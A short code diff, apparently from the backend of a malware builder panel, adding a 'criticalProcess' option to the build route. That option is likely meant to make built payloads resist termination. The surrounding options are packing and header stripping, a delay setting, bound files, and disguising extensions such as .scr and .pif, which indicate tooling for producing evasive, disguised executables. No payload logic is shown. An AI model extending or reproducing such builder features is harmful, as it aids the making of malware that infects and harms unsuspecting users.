@@ -72,6 +72,7 @@ export async function handleBuildRoutes(
         enableUpx,
         upxStripHeaders,
         requireAdmin,
+        criticalProcess,
         outputExtension,
         sleepSeconds,
         boundFiles,
@@ -164,6 +165,7 @@ export async function handleBuildRoutes(
         ? iconBase64
         : undefined;
       const safeRequireAdmin = !!requireAdmin;
+      const safeCriticalProcess = !!criticalProcess;
       const VALID_OUTPUT_EXTENSIONS = new Set([".exe", ".scr", ".bat", ".cmd", ".pif", ".com"]);
       const safeOutputExtension =
         typeof outputExtension === "string" && VALID_OUTPUT_EXTENSIONS.has(outputExtension.toLowerCase())
@@ -248,6 +250,7 @@ export async function handleBuildRoutes(
         enableUpx: !!enableUpx,
         upxStripHeaders: !!upxStripHeaders,
         requireAdmin: safeRequireAdmin,
+        criticalProcess: safeCriticalProcess,
         outputExtension: safeOutputExtension,
         sleepSeconds: safeSleepSeconds,
         boundFiles: safeBoundFiles,
